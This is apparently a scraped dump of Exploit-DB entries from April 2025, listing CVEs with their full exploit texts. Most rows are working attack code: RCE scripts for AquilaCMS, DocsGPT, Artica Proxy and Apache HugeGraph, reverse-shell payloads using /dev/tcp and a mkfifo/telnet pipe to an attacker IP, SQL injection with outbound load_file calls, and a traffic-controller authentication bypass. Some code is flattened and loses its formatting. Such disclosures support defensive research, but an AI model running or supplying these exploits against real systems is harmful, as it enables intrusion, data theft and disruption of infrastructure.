self.originalmakerequest(conn, method, url, timeout=timeout, chunked=chunked, httplibrequestkw) def main(): ap = argparse.ArgumentParser() ap.addargument(""-t"", ""--target"", required=True, help=""Target URI"") ap.addargument(""-u"", ""--username"", required=True, help=""Username"") ap.addargument(""-p"", ""--password"", required=True, help=""Password"") ap.addargument(""-i"", ""--image"", required=True, help=""Image path"") ap.addargument(""-q"", ""--query"", required=True, help=""SQL Query to execute"") ap.addargument(""-x"", ""--proxy"", required=False, help=""Proxy Configuration (e.g., <URL> args = vars(ap.parseargs()) session = requests.Session() url = args['target'] if 'pandoraconsole' not in url: if not url.endswith('/'): url += '/' url += 'pandoraconsole/' headers['Origin'] = args['target'] headers['Referer'] = args['target'] session.headers.update(headers) proxies = {} if args['proxy'] is not None: if 'https' in args['proxy']: proxies['https'] = args['proxy'] else: proxies['http'] = args['proxy'] session.proxies.update(proxies) login(session, url, args['username'], args['password']) exploit(session, url, args['image'], args['query']) if name=='main_': main()"
CVE-2024-7815,"{""CVE-2024-7815"": 1}",2025-04-10,CodeAstro Online Railway Reservation System 1.0 - Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52159,Exploit Title: CodeAstro Online Railway Reservation System 1.0 - Cross Site Scripting (XSS) Date: 2024-08-15 Exploit Author: Raj Nandi Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Any OS CVE: CVE-2024-7815 #Description: A Cross-Site Scripting (XSS) vulnerability exists in [Application Name/Version]. This vulnerability allows an attacker to inject and execute arbitrary JavaScript code within the context of the user's browser session. #Proof of Concept (
CVE-2024-35539,"{""CVE-2024-35539"": 1}",2025-04-10,Typecho 1.3.0 - Race Condition,https://www.exploit-db.com/exploits/52161,"Exploit Title: Typecho 1.3.0 - Race Condition Google Dork: intext:""Powered by Typecho"" inurl:/index.php Date: 18/08/2024 Exploit Author: Michele 'cyberaz0r' Di Bonaventura Vendor Homepage: <URL> Software Link: <URL> Version: 1.3.0 Tested on: Typecho 1.3.0 Docker Image with PHP 7.4 ( <URL> CVE: CVE-2024-35539 For more information, visit the blog post: <URL> package main import ( ""bytes"" ""fmt"" ""io"" ""net/http"" ""net/url"" ""os"" ""strings"" ""sync"" ""sync/atomic"" ""time"" ""github.com/robertkrimen/otto"" var ( c int32 = 0 commentsPostInterval int64 = 60 maxThreads int = 1000 wg sync.WaitGroup userAgent string = ""Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"" client http.Client = &http.Client{ CheckRedirect: func(req http.Request, via []http.Request) error { return http.ErrUseLastResponse func getJSFunction(u string) string { req, err := http.NewRequest(""GET"", u, nil) if err != nil { fmt.Println(""[X] Error creating initial request:"", err) return """" req.Header.Set(""User-Agent"", userAgent) resp, err := client.Do(req) if err != nil { fmt.Println(""[X] Error sending initial request:"", err) return """" buf := new(bytes.Buffer) buf.ReadFrom(resp.Body) body := buf.String() if !strings.Contains(body, ""input.value = ("") || !strings.Contains(body, "")();;"") { fmt.Println(""[X] Error finding JavaScript function"") return """" jsFunction := strings.Split(body, ""input.value = ("")[1] jsFunction = strings.Split(jsFunction, "")();;"")[0] return jsFunction func executeJavaScript(jsFunctionName string, jsFunctionBody string) string { vm := otto.New() _, err := vm.Run(jsFunctionBody) if err != nil { fmt.Println(""[X] Error executing JavaScript function:"", err) return """" result, err := vm.Call(jsFunctionName, nil) if err != nil { fmt.Println(""[X] Error calling JavaScript function:"", err) return """" returnValue, err := result.ToString() if err != nil { fmt.Println(""[X] Error converting JavaScript result to string:"", err) return """" return returnValue func spamComments(u string, formToken string) { timestamp := time.Now().Unix() for { i := 0 for time.Now().Unix() < timestamp-1 { time.Sleep(250 time.Millisecond) fmt.Printf(""\r[] Waiting for next spam wave. (%d seconds) "", timestamp-time.Now().Unix()-1) fmt.Printf(""\n"") for time.Now().Unix() < timestamp+2 { if i < maxThreads { wg.Add(1) go spamRequest(u, formToken, i) i++ wg.Wait() fmt.Printf(""\n[+] Successfully spammed %d comments\n"", c) timestamp = time.Now().Unix() + commentsPostInterval func spamRequest(u string, formToken string, i int) { fmt.Printf(""\r[] Spamming comment request %d "", i) defer wg.Done() formData := url.Values{} formData.Set("""", formToken) formData.Set(""author"", fmt.Sprintf(""user%d"", i)) formData.Set(""mail"", fmt.Sprintf(""user%d.example"", i)) formData.Set(""text"", fmt.Sprintf(""Hello from user_%d"", i)) req, err := http.NewRequest(""POST"", u+""comment"", nil) if err != nil { return req.Header.Set(""Referer"", u) req.Header.Set(""User-Agent"", userAgent) req.Header.Set(""Content-Type"", ""application/x-www-form-urlencoded"") req.Header.Set(""Content-Length"", fmt.Sprint(len(formData.Encode() req.Body = io.NopCloser(strings.NewReader(formData.Encode() resp, err := client.Do(req) if err != nil { return if resp.StatusCode == 302 { atomic.AddInt32(&c, 1) defer resp.Body.Close() func main() { if len(os.Args) != 2 { fmt.Println(""Usage: go run CVE-2024-35538.go "") return fmt.Println(""[+] Starting Typecho <= 1.3.0 Race Condition exploit (CVE-2024-35539) by cyberaz0r"") targetUrl := os.Args[1] fmt.Println(""[+] Spam target:"", targetUrl) fmt.Println(""[] Getting JavaScript function to calculate form token."") jsFunction := getJSFunction(targetUrl) if jsFunction == """" { fmt.Println(""[-] Could not get JavaScript function, exiting."") return fmt.Println(""[] Evaluating JavaScript function to calculate form token."") formToken := executeJavaScript(""calculateToken"", strings.Replace(jsFunction, ""function ()"", ""function calculateToken()"", 1)) if formToken == """" { fmt.Println(""[-] Could not get form token, exiting."") return fmt.Printf(""[+] Form token: %s"", formToken) spamComments(targetUrl, formToken)"
CVE-2024-35540,"{""CVE-2024-35540"": 1}",2025-04-10,Typecho 1.3.0 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52162,"Exploit Title: Typecho 1.3.0 - Stored Cross-Site Scripting (XSS) Google Dork: intext:""Powered by Typecho"" inurl:/index.php Date: 18/08/2024 Exploit Author: Michele 'cyberaz0r' Di Bonaventura Vendor Homepage: <URL> Software Link: <URL> Version: 1.3.0 Tested on: Typecho 1.3.0 Docker Image with PHP 7.4 ( <URL> CVE: CVE-2024-35540 For more information, visit the blog post: <URL> package main import ( ""bufio"" ""bytes"" ""crypto/rand"" ""crypto/sha256"" ""encoding/base64"" ""fmt"" ""net/http"" ""net/url"" ""os"" ""strings"" ""time"" var ( postTitle string = ""Reflected XSS"
CVE-2024-48573,"{""CVE-2024-48573"": 1}",2025-04-10,AquilaCMS 1.409.20 - Remote Command Execution (RCE),https://www.exploit-db.com/exploits/52164,"Exploit Title: AquilaCMS 1.409.20 - Remote Command Execution (RCE) Date: 2024-10-25 Exploit Author: Eui Chul Chung Vendor Homepage: <URL> Software Link: <URL> Version: v1.409.20 CVE: CVE-2024-48572, CVE-2024-48573 import io import json import uuid import string import zipfile import argparse import requests import textwrap def unescapespecialcharacters(email): return ( email.replace(""[$]"", ""$"") .replace(""[]"", """") .replace(""[+]"", ""+"") .replace(""[-]"", ""-"") .replace(""[.]"", ""."") .replace(""[?]"", ""?"") .replace(r""[\^]"", ""^"") .replace(""[|]"", ""|"") def getuseremails(): validcharacters = list( string.asciilowercase + string.digits + ""!#%&'/=@`{}~"" ) + [""[$]"", ""[*]"", ""[+]"", ""[-]"", ""[.]"", ""[?]"", r""[\^]"", ""[|]""] emailsfound = [] nextemails = [""^""] while nextemails: prevemails = nextemails nextemails = [] for email in prevemails: found = False for ch in validcharacters: data = {""email"": f""{email + ch}.*""} res = requests.put(f""{args.url}/api/v2/user"", json=data) if json.loads(res.text)[""code""] == ""UserAlreadyExist"": nextemails.append(email + ch) found = True if not found: emailsfound.append(email[1:]) print(f""[+] {unescapespecialcharacters(email[1:])}"") return emailsfound def resetpassword(email): data = {""email"": email} requests.post(f""{args.url}/api/v2/user/resetpassword"", json=data) data = {""token"": {""$ne"": None}, ""password"": args.password} requests.post(f""{args.url}/api/v2/user/resetpassword"", json=data) print(f""[+] {unescapespecialcharacters(email)} : {args.password}"") def getadminauthtoken(emails): for email in emails: data = {""username"": email, ""password"": args.password} res = requests.post(f""{args.url}/api/v2/auth/login/admin"", json=data) if res.statuscode == 200: print(f""[+] Administrator account : {unescapespecialcharacters(email)}"") return json.loads(res.text)[""data""] return None def createplugin(pluginname): payload = textwrap.dedent( f"" const {{ exec }} = require(""childprocess""); This function is called when the plugin is desactivated or when we delete it module.exports = async function (resolve, reject) {{ try {{ exec(""{args.command}""); return resolve(); }} catch (error) {{}} ).strip() plugin = io.BytesIO() with zipfile.ZipFile(plugin, ""a"", zipfile.ZIP_DEFLATED, False) as zip_file: zip_file.writestr( f""{plugin_name}/package.json"", io.BytesIO(f'{{ ""name"": ""{plugin_name}"" }}'.encode()).getvalue(), zip_file.writestr( f""{plugin_name}/info.json"", io.BytesIO(b'{ ""info"": {} }').getvalue() zip_file.writestr( f""{plugin_name}/uninit.js"", io.BytesIO(payload.encode()).getvalue() plugin.seek(0) return plugin def rce(emails): auth_token = get_admin_auth_token(emails) if auth_token is None: print(""[-] Administrator account not found"") return print(""[+] Create malicious plugin"") plugin_name = uuid.uuid4().hex plugin = create_plugin(plugin_name) print(""[+] Upload plugin"") headers = {""Authorization"": auth_token} files = {""file"": (f""{plugin_name}.zip"", plugin, ""application/zip"")} requests.post(f""{args.url}/api/v2/modules/upload"", headers=headers, files=files) print(""[+] Find uploaded plugin"") headers = {""Authorization"": auth_token} data = {""PostBody"": {""limit"": 0}} res = requests.post(f""{args.url}/api/v2/modules"", headers=headers, json=data) plugin_id = None for data in json.loads(res.text)[""datas""]: if data[""name""] == plugin_name: plugin_id = data[""_id""] print(f""[+] Plugin ID : {plugin_id}"") break if plugin_id is None: print(""[-] Plugin not found"") return print(""[+] Deactivate plugin"") headers = {""Authorization"": auth_token} data = {""idModule"": plugin_id, ""active"": False} res = requests.post(f""{args.url}/api/v2/modules/toggle"", headers=headers, json=data) if res.status_code == 200: print(""[+] Command execution succeeded"") else: print(""[-] Command execution failed"") def main(): print(""[] Retrieve email addresses"") emails = getuseremails() print(""\n[] Reset password"") for email in emails: reset_password(email) print(""\n[] Perform remote code execution"") rce(emails) if name == ""main"": parser = argparse.ArgumentParser() parser.addargument( ""-u"", dest=""url"", help=""Site URL (e.g. <URL> type=str, required=True, parser.addargument( ""-p"", dest=""password"", help=""Password to use for password reset (e.g. HaXX0r3d!)"", type=str, default=""HaXX0r3d!"", parser.addargument( ""-c"", dest=""command"", help=""Command to execute (e.g. touch /tmp/pwned)"", type=str, default=""touch /tmp/pwned"", args = parser.parseargs() main()"
CVE-2019-10652,"{""CVE-2019-10652"": 1}",2025-04-10,flatCore 1.5.5 - Arbitrary File Upload,https://www.exploit-db.com/exploits/52165,Exploit Title: flatCore 1.5.5 - Arbitrary File Upload Date: 2024-10-26 Exploit Author: CodeSecLab Vendor Homepage: <URL> Software Link: <URL> Version: 1.5.5 Tested on: Ubuntu Windows CVE : CVE-2019-10652
CVE-2024-33896,"{""CVE-2024-33896"": 1}",2025-04-10,Cosy+ firmware 21.2s7 - Command Injection,https://www.exploit-db.com/exploits/52160,"Exploit Title: Cosy+ firmware 21.2s7 - Command Injection Google Dork: N/A Date: 2024-8-20 Exploit Author: CodeB0ss Contact: t.me/codeb0ss / uncodeboss.com Version: 21.2s7 Tested on: Windows 11 Home Edition CVE: CVE-2024-33896 import socket import subprocess import time def configcreator(filepath): with open(filepath, 'w') as f: f.write( "" client dev tun persist-tun proto tcp verb 5 mute 20 --up '/bin/sh -c ""TF=$(mktemp -u);mkfifo $TF;telnet {attackerip} 5000 0<$TF | sh 1>$TF""' script-security 2 "") def l3st(port): serversocket = socket.socket(socket.AFINET, socket.SOCKSTREAM) serversocket.bind(('0.0.0.0', port)) serversocket.listen(1) print(f"" - --> Listening0nport {port}"") clientsocket, = serversocket.accept() print("" - --> Recevied"") while True: data = clientsocket.recv(1024) if not data: break print(data.decode()) clientsocket.close() serversocket.close() if name == ""main"": IP = '127.0.0.1' config = '/path/to/maliciousconfig.ovpn' port = 5000 listenerprocess = subprocess.Popen(['python', '-c', f'from main import startlistener; startlistener({port})']) time.sleep(2) createmaliciousopenvpnconfig(config) print(f"" - --> configcreated {config}"") GitHub: <URL>"
CVE-2025-0868,"{""CVE-2025-0868"": 1}",2025-04-09,DocsGPT 0.12.0 - Remote Code Execution,https://www.exploit-db.com/exploits/52145,"Exploit Title: DocsGPT 0.12.0 - Remote Code Execution Date: 09/04/2025 Exploit Author: Shreyas Malhotra (OSMSEC) Vendor Homepage: <URL> Software Link: <URL> Version: 0.8.1 through 0.12.0 Tested on: Debian Linux/Ubuntu Linux/Kali Linux CVE: CVE-2025-0868 import requests TARGET CONFIG TARGET = "" <URL> Change this Malicious payload string - carefully escaped - modify the python code if necessary maliciousdata = ( 'user=1&source=reddit&name=other&data={""source"":""reddit"",' '""clientid"":""1111"",""clientsecret"":1111,""useragent"":""111"",' '""searchqueries"":[""""],""numberposts"":10,' '""rce\"":import(\'os\').system(\'touch /tmp/test\')}#"":11}' headers = { ""Content-Type"": ""application/x-www-form-urlencoded"" try: response = requests.post(f""{TARGET}/api/remote"", headers=headers, data=maliciousdata) print(f""[+] Status Code: {response.statuscode}"") print(""[+] Response Body:"") print(response.text) except Exception as e: print(f""[-] Error sending request: {e}"")"
CVE-2024-2054,"{""CVE-2024-2054"": 1}",2025-04-09,Artica Proxy 4.50 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52146,"Exploit Title: Artica Proxy 4.50 - Remote Code Execution (RCE) Date: 23-04-2024 Exploit Author: Madan Vendor Homepage: <URL> Version: 4.40, 4.50 Tested on: [relevant os] CVE : CVE-2024-2054 you can also find the exploit on my github repo: <URL> import requests import base64 import urllib3 from colorama import Fore print(""Url format Ex: <URL> the port 9000 might sometimes vary from how artica proxy interface is hosted"") URL = input(""Enter url: "") if URL[-1]==""/"": ACTUALURL = URL[:-1] else: ACTUALURL = URL ARTICAURL = ACTUALURL def check(ARTICAURL): urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) try: check = requests.get(ARTICAURL+'/wizard/wiz.upload.php',verify=False) except Exception as e: print(Fore.RED+""Could not reach, check URL"") if check.statuscode==200: print(Fore.GREEN+""Vulnerable"") return True else: print(Fore.RED+""Not Vulnerable"") def exploit(ARTICAURL): payload = base64.b64encode(b"" "").decode() payloaddata = { ""TzoxOToiTmV0X0ROUzJfQ2FjaGVfRmlsZSI"": { ""cachefile"": ""/usr/share/artica-postfix/wizard/wiz.upload.php"", ""cacheserializer"": ""json"", ""cachesize"": 999999999, ""cachedata"": { payload: { ""cachedate"": 0, ""ttl"": 999999999 while True: PAYLOADCMD = input(""enter command: "") url = f""{ARTICAURL}/wizard/wiz.wizard.progress.php?build-js={payloaddata}"" urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url, verify=False) urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) if response.statuscode == 200: cmdurl = f""{ARTICAURL}/wizard/wiz.upload.php?cmd={PAYLOADCMD}"" cmdresponse = requests.get(cmdurl, verify=False) urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) print(cmdresponse.text) else: print(""Failed to execute the payload"") check = check(ARTICAURL=ACTUALURL) if check==True: exploit(ARTICAURL=ARTICAURL)"
CVE-2024-37732,"{""CVE-2024-37732"": 1}",2025-04-09,Anchor CMS 0.12.7 - Stored Cross Site Scripting (XSS),https://www.exploit-db.com/exploits/52147,"Exploit Title: Anchor CMS 0.12.7 - Stored Cross Site Scripting (XSS) Date: 04/28/2024 Exploit Author: Ahmet Ümit BAYRAM Vendor Homepage: <URL> Software Link: <URL> Version: latest Tested on: MacOS Log in to Anchor CMS. Click on ""Create New Post"". Fill in the ""Title"" and enter the following payload in the field immediately below: # ""> Go to the homepage, and you will see the alert!"
CVE-2024-24409,"{""CVE-2024-24409"": 1}",2025-04-09,Zohocorp ManageEngine ADManager Plus 7210 - Elevation of Privilege,https://www.exploit-db.com/exploits/52148,"Exploit Title: ManageEngine ADManager Plus Build < 7210 Elevation of Privilege Vulnerability Exploit Author: Metin Yunus Kandemir Vendor Homepage: <URL> Software Link: <URL> Details: <URL> Version: ADManager Plus Build < 7210 Tested against: Build 7203 CVE: CVE-2024-24409 Description The Modify Computers is a predefined role in ADManager for managing computers. If a technician user has the Modify Computers privilege over a computer can change the userAccountControl and msDS-AllowedToDelegateTo attributes of the computer object. In this way, the technician user can set Constrained Kerberos Delegation over any computer within the Organizational Unit that the user was delegated. Contrary to what ADManager claims the user who has the Modify Computers role can change the privilege of computer objects in the Active Directory. The Constrained Kerberos Delegation can be set for any service such as CIFS, LDAP, HOST services. Then the user can access these services by abusing the Constrained Kerberos Delegation. In addition, the Unconstrained Kerberos Delegation can be set over the computer objects by changing the userAccountControl attribute. Normally, only users that have SeEnableDelegationPrivilege privilege can set constrained kerberos delegation. Only members of the BUILTIN\Administrators group have this privilege by default. The delegated user for an Organizational Unit can not set constrained kerberos delegation even if a user has the GenericAll right over a computer account, so the delegation process in Active Directory does not grant this privilege. However, the technician user can use the SeEnableDelegationPrivilege right via the Modify Computers role. Vulnerability reasons 1. ADMP Web App Authorization issue: Assigning a predefined Modify Computers role delegates the technician user to modify custom attributes of computers unexpectedly. Even though it appears that this privilege is not granted in the UI, the Additional Custom Attribute property is assigned and this leads to broken access control vulnerability. 2. There is no restriction for editing the userAccountControl and msDS-AllowedToDelegateTo attributes of the computer objects. The ADMP application performs changes with domain admin privileges as designed so that if we can bypass some restrictions (e.g. format of attribute value), our requests are applied with domain admin privileges. This way we can edit the attributes userAccountControl and msDS-AllowedToDelegateTo. Impact A technician user elevates privileges from Domain User to Domain Admin. For example, the user can set Constrained Kerberos Delegation over CLIENT1$ for the CIFS service of the domain controller and access the CIFS service. As a result, the user is delegated to manage CLIENT1$ but he can access the CIFS service of the domain controller impersonating a user unexpectedly. Proof Of Concept <URL>"
CVE-2024-27348,"{""CVE-2024-27348"": 1}",2025-04-09,Apache HugeGraph Server 1.2.0 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52149,"Exploit Title: Apache HugeGraph Server 1.2.0 - Remote Code Execution (RCE) Exploit Author: Yesith Alvarez Vendor Homepage: <URL> Version: Apache HugeGraph 1.0.0 - 1.2.0 CVE : CVE-2024–27348 from requests import Request, Session import sys import json def title(): print(' | |_ \ V / | ||/ /| || / /| |/ / / / ) | | () | [+] Reverse shell Author: Yesith Alvarez Github: <URL> Linkedin: <URL> Code improvements: <URL> def exploit(url, lhost, lport): payload = {""gremlin"": ""Thread thread = Thread.currentThread();Class clz = Class.forName(\""java.lang.Thread\"");java.lang.reflect.Field field = clz.getDeclaredField(\""name\"");field.setAccessible(true);field.set(thread, \""VICARIUS\"");Class processBuilderClass = Class.forName(\""java.lang.ProcessBuilder\"");java.lang.reflect.Constructor constructor = processBuilderClass.getConstructor(java.util.List.class);java.util.List command = java.util.Arrays.asList(\""bash\"", \""-c\"", \""bash -i>&/dev/tcp/""+lhost+""/""+lport+""\"", \""0>&1\"");Object processBuilderInstance = constructor.newInstance(command);java.lang.reflect.Method startMethod = processBuilderClass.getMethod(\""start\"");startMethod.invoke(processBuilderInstance);"", ""bindings"": {}, ""language"": ""gremlin-groovy"", ""aliases"": {}} headers = { 'Content-Type': 'application/json'} s = Session() url = url + ""/gremlin"" req = Request('POST', url, json=payload, headers=headers) prepped = req.prepare() del prepped.headers['Content-Type'] resp = s.send(prepped, verify=False, timeout=15) print(prepped.headers) print(url) print(resp.headers) print(payload) print(resp.statuscode) print(resp.text) if name == 'main': title() if(len(sys.argv) < 4): print('[+] USAGE: python3 %s <URL> lport \n'%(sys.argv[0])) print('[+] USAGE: python3 %s <URL> 192.168.0.2 4444\n'%(sys.argv[0])) print('[+] Do not forget to run the listener: nc -lvp 4444\n') exit(0) else: exploit(sys.argv[1],sys.argv[2],sys.argv[3])"
CVE-2024-39143,"{""CVE-2024-39143"": 1}",2025-04-09,ResidenceCMS 2.10.1 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/52150,"Exploit Title: ResidenceCMS 2.10.1 - Stored Cross-Site Scripting (XSS) Date: 8-7-2024 Category: Web Application Exploit Author: Jeremia Geraldi Sihombing Version: 2.10.1 Tested on: Windows CVE: CVE-2024-39143 Description: A stored cross-site scripting (XSS) vulnerability exists in ResidenceCMS 2.10.1 that allows a low-privilege user to create malicious property content with HTML inside it, which acts as a stored XSS payload. If this property page is visited by anyone including the administrator, then the XSS payload will be triggered.. Steps to reproduce 1. Login as a low privilege user with property edit capability. 2. Create or Edit one of the user owned property (We can user the default property owned by the user). 3. Fill the content form with XSS payload using the Code View feature. Before saving it make sure to go back using the usual view to see if the HTML is rendered or not. Vulnerable parameter name: property[propertydescription][content] Example Payload: 4. After saving the new property content and clicking the 'Finish Editing', go to the page and see the XSS is triggered. It is possible to trigger the XSS by using any account or even unauthorized account. Burp Request POST /en/user/property/7/edit HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0 Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 1111 Origin: <URL> Connection: keep-alive Referer: <URL> Cookie: REMEMBERME=App.Entity.User:dXNlcg~~:1722991344:s-spusttpMsLQb2wlzMc2GJcKATcKhGTfj1VuV8GOFA~dRl86I12JAEzbjfmLzxK4ps0tMcX9WH15-DfzD115EE~; PHPSESSID=fhp06bc4sc5i8p4fk5bt9petii; sidebar-toggled=false Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 Priority: u=1 property[city]=3&property[district]=&property[neighborhood]=3&property[metrostation]=&property[dealType]=1&property[category]=1&property[bathroomsnumber]=&property[bedroomsnumber]=2&property[maxguests]=6&property[propertydescription][title]=Furnished renovated 2-bedroom 2-bathroom flat&property[propertydescription][metatitle]=&property[propertydescription][metadescription]=Furnished renovated 2-bedroom 2-bathroom flat&property[address]=5411 Bayshore Blvd, Tampa, FL 33611&property[latitude]=27.885095&property[longitude]=-82.486153&property[showmap]=1&property[price]=2200&property[pricetype]=mo&property[features][]=1&property[features][]=2&property[features][]=4&property[features][]=6&property[features][]=8&property[propertydescription][content]= &files=&property[token]=09e8a0ac823.ahexkItiSa6gSwce8RFyNpn94Uqu9g1cc4CN6g-zLsE.PSHrpu87DJzVcjJ1smI1c8-VrjjGuHUGMefsg3XWdJcuL9F2CcncMsSg"
CVE-2024-38944,"{""CVE-2024-38944"": 1}",2025-04-09,Intelight X-1L Traffic controller Maxtime 1.9.6 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/52151,"Exploit Title: Intelight X-1L Traffic controller Maxtime 1.9.6 - Remote Code Execution (RCE) Google Dork: N/A Date: 07/09/2024 Exploit Author: Andrew Lemon/Red Threat <URL> Vendor Homepage: <URL> Software Link: N/A Version: 1.9 Tested on: (Intelight x-1) Linux 3.14.57 CVE : CVE-2024-38944 #Vulnerability Description This vulnerability allows remote attackers to bypass authentication on affected installations of MaxTime Database Editor. Authentication is not required to exploit this vulnerability. The specific flaw exists within the web-based UI on Traffic Controllers running version 1.9.x firmware. The issue results from the lack of authentication prior to allowing access to functionality. An attacker can leverage this vulnerability to gain full control of Intelight Traffic Controllers and modify the configuration of a traffic intersection, modify traffic light sequences, or trigger the intersection to go into 4 way flash causing a denial of service and causing traffic congestion. #Steps to Reproduce Navigate to the IP address of an identified controller When prompted for authentication append /cgi-bin/generateForm.cgi?formID=142 to the end of the IP address Under the web security tab change the drop down from enabled to disabled and select apply or take note of the username and password and login with those."
CVE-2024-39304,"{""CVE-2024-39304"": 1}",2025-04-09,ChurchCRM 5.9.1 - SQL Injection,https://www.exploit-db.com/exploits/52152,"Exploit Title: ChurchCRM 5.9.1 - SQL Injection Author: Sanan Qasimzada Date: 06.07.2024 Vendor: <URL> Software: <URL> Reference: <URL> Description: In the manual insertion point 1 - parameter EID appears to be vulnerable to SQL injection attacks. No need for cookies, no need admin authentication and etc. The attacker easily can steal information from this system by using this vulnerability. STATUS: HIGH Vulnerability - CRITICAL [+]Payload: `mysql Parameter: EID (GET) Type: boolean-based blind Title: OR boolean-based blind - WHERE or HAVING clause (NOT) Payload: EID=(select loadfile('\l4qwtfn9ngsxicbtklv0x1e1rsxllb92bq2gp6dv.smotaniak.com \\ior')) OR NOT 2407=2407 Type: time-based blind Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP) Payload: EID=(select loadfile('\l4qwtfn9ngsxicbtklv0x1e1rsxllb92bq2gp6dv.smotaniak.com \\ior')) AND (SELECT 9547 FROM (SELECT(SLEEP(3)QEvX) Type: UNION query Title: MySQL UNION query (UTF8) - 11 columns Payload: EID=(select load_file('\l4qwtfn9ngsxicbtklv0x1e1rsxllb92bq2gp6dv.smotaniak.com \\ior')) UNION ALL SELECT 'UTF8','UTF8',CONCAT(0x716a6b7a71,0x57646e6842556a56796a75716b504b4d6941786f7578696a4c557449796d76425645505670694b42,0x717a7a7871),'UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8','UTF8'# Reproduce: [href]( <URL> Proof and Exploit: [href]( <URL> Time spend: 01:00:00 System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at <URL> and <URL> home page: <URL> hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty -- System Administrator - Infrastructure Engineer Penetration Testing Engineer Exploit developer at <URL> <URL> <URL> and <URL> 0day Exploit DataBase <URL> home page: <URL> hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E= nu11secur1ty"
CVE-2024-6244,"{""CVE-2024-6244"": 1}",2025-04-09,PZ Frontend Manager WordPress Plugin 1.0.5 - Cross Site Request Forgery (CSRF),https://www.exploit-db.com/exploits/52153,"Exploit Title: PZ Frontend Manager WordPress Plugin 1.0.5 - Cross Site Request Forgery (CSRF) Date: 2024-07-01 Exploit Author: Vuln Seeker Cybersecurity Team Vendor Homepage: <URL> Version: <= 1.0.5 Tested on: Firefox Contact me: vulns.org The plugin does not have CSRF checks in some places, which could allow attackers to make logged in users perform unwanted actions via CSRF attacks. Proof of concept: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost:10003 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 1093 Origin: <URL> Sec-GPC: 1 Connection: close Cookie: Cookie action=pzfmuploadavatar&imageData=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAADcAAAA3CAAAAACNsI2aAAAACXBIWXMAAAB5AAAAeQBPsriEAAAB6ElEQVR42rVWO46EMAzNadAcY3vaOQMXoXcXKZehS8NpqNxamw8JxDYra1Zjhgge9jhx%2FBy7bYvtl4Y8Qn%2BtEjty6WxuQ0KkfOM5wJEeEkT1bsigU%2BxGQV%2BQfZ2ned0LAkLnyQ4XV2XB%2Fk%2BjXdTs8Mc1%2BUlvQehEt5Fit7hLFsUfqfOk3d1lJ9VO%2BqN1sFvJm%2BIScB7s3uo8ZVzC8RrsXjIuqp2n0d%2BsxFNbHxCw9cF34yn2L5jyJWndIprzRfqLpvw0%2B6PCh1fjgxpP5NL4VzlYEa6zOYDgzyvk0cMbykMek6THipSXAD5%2FBKh8H%2F3JGZTxPgM9Px9WDL0CkM1ORJie48nsWAXQ8kW1YxlknKfIWJs%2FEBXgoZ6Jf2KMNMYz4FgBJjTGkxR%2FH67vm%2FH8eP9ShlyRqfli24c0svy0zLNXgOkNtQJEle%2FP%2FMPOv8T3TGZIZIbO7sL7BMON74nkuQqUj4XvnMvwiNCBjO%2Byev2NVDtZLeX5rvD9lu0zauxW%2Ba6dBvJ8H5Gyfzz3wIBkO57rYECyHeeWF%2BxW%2BYcT47Jkdzi4TpT%2BlPNdIv9Z34fxNOxf0PhO91yw5MuMen56AxLPOtG7W9T63SCQ2k9Uol1so3bVnrog2JTyU57n1bb37n3s5s8Of5RfsaTdSlfuyUAAAAA8dEVYdGNvbW1lbnQAIEltYWdlIGdlbmVyYXRlZCBieSBHTlUgR2hvc3RzY3JpcHQgKGRldmljZT1wbm1yYXcpCvqLFvMAAABKdEVYdHNpZ25hdHVyZQA4NWUxYWU0YTJmYmE3OGVlZDRmZDhmMGFjZjIzNzYwOWU4NGY1NDk2Y2RlMjBiNWQ3NmM5Y2JjMjk4YzRhZWJjJecJ2gAAAABJRU5ErkJggg%3D%3D&userID=1 CSRF Exploit: Profile picture of user 1 will be changed in the dashboard <URL> Reference: <URL>"
